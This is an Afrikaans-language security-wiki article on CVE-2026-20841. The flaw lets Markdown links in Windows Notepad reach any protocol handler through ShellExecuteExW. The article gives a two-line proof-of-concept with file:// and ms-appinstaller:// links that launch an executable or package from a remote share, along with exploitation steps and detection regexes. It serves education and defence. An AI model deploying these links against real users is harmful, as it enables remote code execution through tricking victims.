# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Moderne Windows-toepassings wat Markdown/HTML weergee, verander dikwels skakels wat deur gebruikers verskaf word in klikbare elemente en stuur dit na `ShellExecuteExW`. Sonder streng allowlisting van skemas kan enige geregistreerde protocol handler (bv. `file:`, `ms-appinstaller:`) geaktiveer word, wat tot code execution in die huidige gebruiker se konteks kan lei.<sup>[[1]](#references)</sup>

## ShellExecuteExW-oppervlak in Windows Notepad se Markdown-modus
- Notepad kies Markdown-modus **slegs vir `.md`-uitbreidings** deur middel van ’n vaste stringvergelyking in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Ondersteunde Markdown-skakels:
- Standard: `[text](target)`
- Autolink: `<target>` (weergegee as `[target](target)`), dus is albei sintakse belangrik vir payloads en detection.
- Daar word na skakelklikke verwerk in `sub_140170F60()`, wat swak filtering uitvoer en daarna `ShellExecuteExW` aanroep.
- `ShellExecuteExW` stuur versoeke na **enige gekonfigureerde protocol handler**, nie net HTTP(S) nie.<sup>[[1]](#references)</sup>

### Payload-oorwegings
- Enige `\\`-reekse in die skakel word **genormaliseer na `\`** voordat `ShellExecuteExW` uitgevoer word, wat UNC-/padkonstruksie en detection beïnvloed.
- `.md`-lêers word **nie by verstek met Notepad geassosieer nie**; die slagoffer moet steeds die lêer in Notepad oopmaak en op die skakel klik, maar sodra dit weergegee is, is die skakel klikbaar.
- Gevaarlike voorbeeldskemas:<sup>[[1]](#references)</sup>
- `file://` om ’n plaaslike/UNC-payload te begin.
- `ms-appinstaller://` om App Installer-vloeie te aktiveer. Ander plaaslik geregistreerde skemas kan ook misbruik word.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation-vloei
1. Skep ’n **`.md`-lêer** sodat Notepad dit as Markdown weergee.
2. Bed die skakel in met ’n gevaarlike URI-skema (`file:`, `ms-appinstaller:`, of enige geïnstalleerde handler).
3. Lewer die lêer af (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB of soortgelyk) en oortuig die gebruiker om dit in Notepad oop te maak.
4. Wanneer daarop geklik word, word die **genormaliseerde skakel** aan `ShellExecuteExW` oorhandig, en die ooreenstemmende protocol handler voer die verwysde inhoud binne die gebruiker se konteks uit.<sup>[[1]](#references)[[2]](#references)</sup>

## Opsporingsidees
- Monitor oordragte van `.md`-lêers oor poorte/protokolle wat algemeen gebruik word om dokumente af te lewer: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Ontleed Markdown-skakels (standaard en autolink) en soek na **hoofletter-onsensitiewe** `file:` of `ms-appinstaller:`.
- Regexes volgens Vendor-riglyne om toegang tot afgeleë hulpbronne op te spoor:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Die gedrag van die patch laat glo **plaaslike lêers en HTTP(S) toe via ’n allowlist**; enigiets anders wat `ShellExecuteExW` bereik, is verdag. Brei opsporing uit na ander geïnstalleerde protocol handlers soos nodig, aangesien die attack surface per stelsel verskil.<sup>[[1]](#references)</sup>

## Verwysings
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
